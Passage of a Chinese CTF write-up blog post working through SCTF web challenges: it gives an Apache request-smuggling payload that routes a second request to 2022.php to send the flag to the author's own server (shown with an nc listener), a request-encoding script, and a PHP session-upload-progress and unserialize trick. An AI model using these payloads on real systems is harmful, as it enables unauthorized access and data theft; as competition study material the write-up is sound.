<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
    <meta name="description" content="è®°å½•ä¸€äº›å¥‡å¥‡æ€ªæ€ªä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
    <meta name="author" content="y1zh3e7">
    
    <title>
        
            SCTF-Webå¤ç° |
        
        y1â€™s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"ä¸€åªåç‰¢çš„webğŸ¶ || æ‡‚è¿›æ”»çŸ¥é˜²å®ˆï¼Œå…ˆæ­£å‘åé€†å‘","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak somethingï¼"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 7.0.0-rc1">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.jpg">
                </a>
            
            <a class="logo-title" href="/">
               y1â€™s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                å‹é“¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                å…³äº
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">å‹é“¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">å…³äº</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">SCTF-Webå¤ç°</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">y1zh3e7</span>
                            
                                <span class="author-label">Lv2</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-06-25 22:19:14</span>
        <span class="mobile">2023-06-25 22:19</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-06-25 22:21:14</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/CTF/">CTF</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/SCTF/">SCTF</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>14 åˆ†é’Ÿ</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <h1 id="SCTF-Webå¤ç°"><a href="#SCTF-Webå¤ç°" class="headerlink" title="SCTF-Webå¤ç°"></a>SCTF-Webå¤ç°</h1><h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a>ezcheck1n</h2><p>èµ›é¢˜è¯„ä»·ï¼šè¿™ä¸å¥½è¯´ï¼Œå¾ˆéš¾è¯„</p>
<p>é¢˜ç›®ä»£ç é€»è¾‘å¦‚ä¸‹ï¼Œä¸»è¦é€»è¾‘æ˜¯ä»å‚æ•°ä¸­è·å–urlå‚æ•°ï¼Œç„¶åæŠŠflagå˜é‡æ‹¼æ¥åˆ°urlåé¢ï¼Œä¹‹åå‘è¿‡å»ï¼Œå…¶å®å°±æ˜¯ä¸ªå¤–å¸¦å›æ˜¾</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">"flag{fake_flag}"</span>;</span><br><span class="line">@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">"http://"</span>.<span class="variable">$_GET</span>[<span class="string">'url'</span>].<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="comment"># but it's not the real flag</span></span><br><span class="line"><span class="comment"># beacuse someone say this year is not 2023 !!! like the post?</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">'./2023.php'</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'./post.jpeg'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="data:image/jpeg;base64,'</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>) . <span class="string">'"&gt;'</span>;</span><br><span class="line"><span class="comment"># notice -&gt; time</span></span><br><span class="line"><span class="comment"># How should you get to where the flag is, the middleware will not forward requests that are not 2023</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>å°è¯•ä¸€ä¸‹ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144319581.png"></p>
<figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@VM-24-4-ubuntu:~<span class="params">#</span> nc -lvnp 7777</span><br><span class="line">Listening on 0.0.0.0 7777</span><br><span class="line">Connection received on 115.239.215.75 54096</span><br><span class="line">GET /flag{fake<span class="built_in">_</span>flag} HTTP/1.0</span><br><span class="line">Host: 43.143.246.73:7777</span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table></figure>

<p>è¿™é‡Œæœ‰ä¸¤ä¸ªåœ°æ–¹å¾ˆå¥‡æ€ªï¼Œä¸€ä¸ªæ˜¯ä¼ å‚çš„æ—¶å€™ï¼Œç”¨<code>?url=xxxx:xxxx/</code>è¿™ç§å½¢å¼ä¼ é€’æ˜¯ä¸è¡Œçš„ï¼Œè¿˜æœ‰å°±æ˜¯æˆ‘å¹¶æ²¡æœ‰åœ¨2023.phpä¸‹è¿›è¡Œå‚æ•°ä¼ é€’ä¹Ÿå¯ä»¥é€šï¼Œå…¶å®è¿™ä¸¤ä¸ªé—®é¢˜éƒ½æ˜¯ä¸€ä¸ªåŸå› ï¼Œå°±æ˜¯apacheçš„Rewriteè§„åˆ™ï¼Œç›¸ä¿¡å¦‚æœäº†è§£è¿‡apache-Rewriteçš„å¸ˆå‚…è‚¯å®šä¸é™Œç”Ÿï¼Œå®ƒé‡‡ç”¨çš„æ˜¯æ­£åˆ™åŒ¹é…çš„æ–¹å¼ï¼Œéšä¾¿ä¸€çŒœä¹Ÿå¯ä»¥çŒœçš„å‡ºæ¥åŒ¹é…çš„æ˜¯/2023/ï¼ˆæ­£åˆ™å†…å®¹ï¼‰ï¼Œç„¶åå°†æ­£åˆ™å†…å®¹ä½œä¸ºå‚æ•°è½¬äº¤ç»™å…¶ä»–é€»è¾‘ï¼ˆ2023.phpï¼‰å¤„ç†ã€‚æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç†è§£æˆåœ¨urlå‰é¢å·²ç»æœ‰ä¸€ä¸ªé»˜è®¤çš„å‚æ•°äº†ï¼Œå°±ä¸èƒ½ç”¨?è¿›è¡Œä¼ å‚ï¼Œè€Œæ˜¯ç”¨&amp;æ‹¼æ¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ‰€ä»¥å…¶å®è¿™æ ·ä¼ ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆè¿™é‡Œæˆ‘å¯èƒ½ç†è§£çš„ä¸å¤Ÿæ·±ï¼Œå¦‚æœæœ‰å¸ˆå‚…æœ‰å…¶ä»–ç†è§£ä¹Ÿå—éº»çƒ¦æŒ‡æ­£ä¸€ä¸‹ï¼‰ï¼š<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624144805079.png"></p>
<p>ç„¶åf12åœ¨ç›¸åº”headerä¸­å¯ä»¥çœ‹åˆ°apacheçš„ç‰ˆæœ¬æ˜¯2.5.4ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„apcheå­˜åœ¨èµ°ç§æ¼æ´ï¼Œè¯´ç™½äº†å°±æ˜¯å¯ä»¥åœ¨ä¸€æ¬¡è¯·æ±‚ä¸­å‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œå‚è€ƒæ–‡ç« å¦‚ä¸‹ï¼š<a class="link" target="_blank" rel="noopener" href="https://forum.butian.net/share/2180%EF%BC%9A">https://forum.butian.net/share/2180ï¼š<i class="fas fa-external-link-alt"></i></a><br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624145004531.png"></p>
<p>ç„¶åå°±åˆ°äº†è¿™é“é¢˜æœ€æŠ½è±¡çš„åœ°æ–¹ï¼Œå°±æ˜¯å¯¹å‡ºé¢˜äººçš„è„‘æ´ï¼Œè¿™äº›æç¤ºå…¶å®å°±æ˜¯å‘Šè¯‰æˆ‘ä»¬ä¸­é—´ä»¶èƒ½è§£æçš„è¯·æ±‚æ˜¯2023çš„ï¼Œä½†æ˜¯çœŸæ­£çš„flagå´ä¸åœ¨2023ä¸­ï¼Œè°œè¯­ç¿»è¯‘è¿‡æ¥å°±æ˜¯è¦ç”¨èµ°ç§æ„é€ ä¸€ä¸ª2023çš„æ•°æ®åŒ…æ¥ç»•è¿‡ä¸­é—´ä»¶ï¼Œç„¶åå†æ„é€ ä¸€ä¸ªè®¿é—®2022.phpçš„æ•°æ®åŒ…æ‹¿åˆ°flagï¼š</p>
<figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">#</span> but it's not the real flag</span><br><span class="line"><span class="params">#</span> beacuse someone say this year is not 2023 !!! like the post?</span><br><span class="line">show<span class="built_in">_</span>source('./2023.php');</span><br><span class="line"><span class="params">#</span> notice -&gt; time</span><br><span class="line"><span class="params">#</span> How should you get to where the flag is, the middleware will not forward requests that are not 2023</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶åè¿™é‡Œèµ›ååˆå¤ç°äº†ä¸€éï¼Œè²Œä¼¼æ˜¯ç¯å¢ƒå¯„äº†ï¼Œæ‹¿å½“æ—¶æ¯”èµ›æ—¶æ‰“é€šçš„payloadå’Œå„ç§å…¶ä»–å¸ˆå‚…çš„payloadå…¨æ˜¯è¶…æ—¶ï¼Œæ•°æ®åŒ…å¤§æ¦‚å°±è¿™ä¹ˆæ„é€ ï¼š</p>
<p>burpéšä¾¿æŠ“ä¸ªåŒ…å­˜åˆ°pre.txtä¸­ï¼Œç„¶åå†™ä¸ªè„šæœ¬æŠŠé‡Œé¢ç©ºæ ¼æ›¿æ¢æˆ%20ï¼Œæ¢è¡Œæ›¿æ¢æˆ%0d%0aï¼š</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">httptext = <span class="string">""</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">'pre.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"><span class="comment">#### è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå°†æ¯ä¸€è¡Œä¸­çš„ç©ºæ ¼æ›¿æ¢ä¸º%20 ####</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line = line.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="comment">#### å°†æ¯ä¸€è¡Œçš„\næ›¿æ¢ä¸º%0d%0a ####</span></span><br><span class="line">    <span class="comment">#### å¹¶å­˜å‚¨åˆ°httptextä¸­ ####</span></span><br><span class="line">    httptext = httptext + line.replace(<span class="string">'\n'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">f.close()</span><br><span class="line">httptext = httptext + <span class="string">""</span></span><br><span class="line"><span class="built_in">print</span>(httptext)</span><br></pre></td></tr></tbody></table></figure>

<p>ä¹‹åå†æ„é€ å‡ºç¬¬äºŒä¸ªæ•°æ®åŒ…å°±è¡Œäº†ï¼Œç„¶åç¬¬äºŒä¸ªæ•°æ®åŒ…è®¿é—®çš„è·¯ç”±å’Œå‚æ•°æ˜¯<code>2022.php?url=vpsip:port/</code>ï¼Œç„¶åä¸¤ä¸ªæ•°æ®åŒ…ä¹‹é—´ç”¨%0d%0a%0d%0aè¿›è¡Œæ‹¼æ¥å°±å¯ä»¥äº†ï¼Œæœ€åæ„é€ å¥½çš„åŒ…æ–‡æ˜¯è¿™æ ·çš„ï¼ˆæ¯”èµ›æ—¶æ‰“é€šçš„ï¼‰ï¼š</p>
<figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /2023/<span class="comment">%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3d43.143.246.73%3a7777 HTTP/1.1</span></span><br><span class="line">Host: 115.239.215.75:8082</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://115.239.215.75:8082/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624153802426.png"></p>
<h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><p>èµ›é¢˜è¯„ä»·ï¼šåŒä¸Šä¸€é¢˜ï¼ˆæç¤ºapp.pyæ˜¯å¹²å˜›çš„ï¼‰</p>
<p>å…ˆæ¥ç‚¹å°è„‘æ´ï¼Œè¿›å…¥ç¯å¢ƒä¹‹åè¯´æ²¡æœ‰Sessionï¼Œè¿™é‡Œæ˜¯phpçš„Sessionï¼Œå¯èƒ½å¾ˆå¤šäººä¼šè¯¯è§£æˆPythonçš„Sessionï¼Œç„¶åå¯ä»¥åˆ©ç”¨PHP_SESSION_UPLOAD_PROGRESSåœ¨å®¢æˆ·ç«¯å¼ºè¡Œåˆ›å»ºä¸€ä¸ªSessionï¼Œå¹¶ä¸”<code>session.upload_progress.name</code>è¿™ä¸ªå±æ€§ï¼ˆSessionå…¨å±€æ•°ç»„ä¸­çš„keyï¼‰æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡POSTä¸€ä¸ªæ¶æ„çš„PHP_SESSION_UPLOAD_PROGRESSå­—æ®µï¼Œå¹¶ä¸”è¿™ä¸ªå­—æ®µçš„Valueå°±æ˜¯è¿™ä¸ª<code>session.upload_progress.name</code>ã€‚</p>
<blockquote>
<p>Session Upload Progress æœ€åˆæ˜¯PHPä¸ºä¸Šä¼ è¿›åº¦æ¡è®¾è®¡çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼ŒPHPå°†è¿›è¡Œæµå¼ä¸Šä¼ ï¼Œå¹¶å°†è¿›åº¦ä¿¡æ¯æ”¾åœ¨Sessionä¸­ï¼Œæ­¤æ—¶å³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚è€Œä¸”ï¼Œé»˜è®¤æƒ…å†µä¸‹session.upload_progress.enabledæ˜¯ä¸ºOnçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç‰¹æ€§é»˜è®¤å¼€å¯ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç‰¹æ€§æ¥åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆå§‹åŒ–Sessionã€‚</p>
</blockquote>
<p>ä»ä¸Šé¢å®˜æ–¹ç»™å‡ºçš„å®šä¹‰ä¸­å¯ä»¥çŸ¥é“PHP_SESSION_UPLOAD_PROGRESSæ˜¯ä¸€ä¸ªç”¨æ¥ç»Ÿè®¡æ–‡ä»¶ä¸Šä¼ è¿›åº¦çš„Sessionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè¡¨å•ï¼ŒPOSTä¸€ä¸ªPHP_SESSION_UPLOAD_PROGRESSå­—æ®µï¼Œå¹¶åŠ å…¥ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå°±å¯ä»¥è·å–åˆ°ä¼ªé€ çš„è¡¨å•æäº¤åŒ…æ–‡äº†ï¼š</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xxxxx/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>ä¸Šä¼ æ–‡ä»¶å¹¶æŠ“åŒ…å¯ä»¥æ‹¿åˆ°è¿™æ ·çš„åŒ…æ–‡ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213220127.png"></p>
<p>æ”¹é€ é¢˜ç›®ç¯å¢ƒçš„åŒ…æ–‡ï¼Œç»•è¿‡ç¬¬ä¸€å…³ï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230624213300251.png"></p>
<p>æ‹¿åˆ°é¢˜ç›®æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)){</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Session not started'</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">'type'</span>];</span><br><span class="line">    <span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">'properties'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">'data'</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>))){</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>)){</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'http://127.0.0.1:5000/'</span>.<span class="variable">$properties</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"this is the object: <span class="subst">$object</span> &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>å…ˆçœ‹ç¬¬ä¸€éƒ¨åˆ†ï¼Œæœ‰ä¸ªå˜é‡è¦†ç›–<code>  extract(unserialize($_POST['data']));</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªæ•°ç»„æ¥è¦†ç›–ä¸Šé¢$typeå’Œ$propertiesçš„å€¼ï¼Œå†å¾€ä¸‹çœ‹å‘ç°æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼š</p>
